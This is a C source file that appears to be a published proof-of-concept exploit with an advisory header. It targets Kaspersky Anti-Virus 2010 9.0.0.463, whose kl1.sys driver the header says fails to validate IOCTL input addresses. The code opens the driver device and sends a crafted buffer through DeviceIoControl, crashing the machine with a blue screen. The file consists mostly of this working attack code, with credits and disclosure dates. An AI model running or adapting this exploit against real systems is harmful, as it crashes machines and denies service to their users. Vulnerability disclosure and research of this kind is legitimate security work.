#include <stdio.h>
#include <windows.h>
#include <winioctl.h>
#include <stdlib.h>
#include <string.h>

/*
Program : Kaspersky Anti-Virus 2010 9.0.0.463
Homepage : http://www.kaspersky.com
Discovery : 2009/09/29
Author Contacted : 2009/10/01
Found by : Heurs
This Advisory : Heurs
Contact : s.leberre@sysdream.com


//----- Application description


The most trusted virus and spyware protection - premium protection
against viruses, spyware, Trojans, worms, bots and more. Also includes
comprehensive phishing and identity theft defense and superfast performance.

//----- Description of vulnerability

kl1.sys driver don't check inputs address of an IOCTL. An exception can be
thrown if we modify one or two DWORDs.
With my test I can't do best exploitation than a BSOD.

//----- Credits

http://www.sysdream.com
http://ghostsinthestack.org

s.leberre at sysdream dot com
heurs at ghostsinthestack dot org

//----- Greetings

Trance

*/

int __cdecl main(int argc, char* argv[])
{
HANDLE hDevice = (HANDLE) 0xffffffff;
DWORD NombreByte;
DWORD Crashing[] = {
0x3ff8f44a, 0x9d4ad6c2, 0xd883673e, 0x0a06ac2a,
0x3d4552b1, 0x3b2f314e, 0xeb6dfc7e, 0xfcfdf961,
0xde0f4405, 0xaa76f8eb, 0x2dbc6ead, 0x534047f9,
0xb5ebadc5
};
BYTE Out[0x20];

printf("Local DoS - Kaspersky 2010 9.0.0.463\n\n");
hDevice = CreateFile("\\\\.\\kimul25",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);

DeviceIoControl(hDevice,0x0022c008,Crashing,sizeof(Crashing),Out,sizeof(Out),&NombreByte,NULL);

printf("Sploit Send.\nhDevice = %x\n", hDevice);
CloseHandle(hDevice);
getch();
return 0;
}